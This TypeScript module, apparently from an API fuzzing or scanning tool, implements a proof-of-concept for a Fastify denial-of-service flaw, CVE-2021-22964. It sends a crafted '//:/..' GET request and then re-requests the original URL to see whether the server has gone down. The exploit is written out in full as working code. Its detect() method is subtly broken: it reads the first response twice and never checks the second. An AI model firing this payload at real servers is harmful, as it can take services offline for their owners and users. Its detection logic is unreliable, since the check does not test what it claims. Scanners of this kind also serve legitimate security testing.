import ApiFuzzerPocGeneric, { ApiFuzzer } from '../api-fuzzer-poc-generic';
import { AxiosResponse } from 'axios';
import { BotFuzzer } from 'libs/databases/botFuzzer.database';
import { ParsedPacket } from 'libs/databases/parsedPacket.database';

export default class FastifyDOSCVE202122964
  extends ApiFuzzerPocGeneric
  implements ApiFuzzer
{
  constructor(botFuzzer: BotFuzzer, packet: ParsedPacket) {
    super(botFuzzer, packet, FastifyDOSCVE202122964.name);
  }

  async poc() {
    const opt = await this.getAxiosOptionsFromPacket(this.packet);
    const rememberUrl = opt.url;
    let { url } = opt;
    if (url[url.length - 1] !== '/') url += '/';
    opt.method = 'GET';

    opt.url = url + '/:/..'; // GET to -> <host>//:/..
    const res1 = await this.sendOneRequest(opt);

    opt.url = rememberUrl; // Resend this
    const res2 = await this.sendOneRequest(opt);

    return [res1, res2];
  }

  async detect(res: AxiosResponse) {
    this.logger.setPrefix('Detection FastifyDOSCVE202122964:');
    const res1 = res[0];
    const res2 = res[0];
    if (res1 === null && res2 === null) {
      this.logger.log('Detected');
      return 1;
    }
    return 0;
  }
}
